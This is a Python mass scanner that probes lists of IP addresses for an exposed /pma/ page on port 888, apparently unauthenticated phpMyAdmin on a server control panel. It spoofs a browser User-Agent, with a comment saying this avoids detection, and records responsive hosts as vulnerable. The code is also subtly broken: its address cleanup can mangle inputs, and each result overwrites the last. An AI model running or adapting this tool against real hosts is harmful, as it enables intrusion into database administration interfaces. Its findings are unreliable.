#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
Author spkiddai
"""

import sys
import argparse
import requests
from multiprocessing import Pool, Manager

print("""
                __   .__    .___  .___      .__ 
  ____________ |  | _|__| __| _/__| _/____  |__|
 /  ___/\____ \|  |/ /  |/ __ |/ __ |\__  \ |  |
 \___ \ |  |_> >    <|  / /_/ / /_/ | / __ \|  |
/____  >|   __/|__|_ \__\____ \____ |(____  /__|
     \/ |__|        \/       \/    \/     \/    
""")

#自定义UA 避免检测UA
headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
           "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",}

def btpam(ip):
    url = "http://%s:888/pma/" % (ip)
    try:
        res = requests.get(url,headers=headers,timeout=5)
        if res.status_code == 200:
            print("%s Potentially Vulnerable"%(ip))
            with open("result.txt","w") as wf:
                wf.write(url)
    finally:
        return

def isbt(ip, q):
    print('Testing {}'.format(ip))
    btpam(ip)
    q.put(ip)

def readip(flie):
    ips = []
    with open(flie,"r") as rf:
        for i in rf.readlines():
            ip = i.lstrip('https://').lstrip('http://').rstrip(':888').rstrip("/").strip()
            ips.append(ip)
    return ips

def pool(ips):
    p = Pool(10)
    q = Manager().Queue()
    for i in ips:
        p.apply_async(isbt, args=(i,q,))
    p.close()
    p.join()
    print('请查看当前路径下文件：result.txt')

def run(filepath):
    ips=readip(filepath)
    pool(ips)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--file',dest='file',type=str,help='批量扫描IP地址，示例：-l ip.txt ')
    parser.add_argument('-i','--ip',dest='ip',type=str,help='单独扫描IP地址，示例：-i 192.168.0.1')
    pa = parser.parse_args()
    if len(sys.argv[1:]) == 0:
        print("输入 -h 参数查看使用说明")
        exit()
    if pa.ip:
        btpam(pa.ip)
    if pa.file:
        run(pa.file)

if __name__ == '__main__':
    main()